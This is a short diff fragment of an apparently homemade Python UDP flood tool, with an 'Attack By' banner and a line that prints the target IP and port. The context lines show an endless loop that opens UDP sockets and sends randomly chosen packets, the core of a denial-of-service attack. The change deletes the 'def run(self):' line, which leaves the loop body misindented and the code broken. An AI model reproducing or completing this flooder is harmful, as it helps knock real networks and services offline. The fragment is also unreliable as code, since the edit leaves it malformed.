@@ -18,7 +18,6 @@ Attack By Xuif X Lexsh1n
 """)
 print(" Attack To Ip %s Port%s             "% (orgip, port) 
 
-    def run(self):
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             msg = Pacotes[random.randrange(0, 3)]
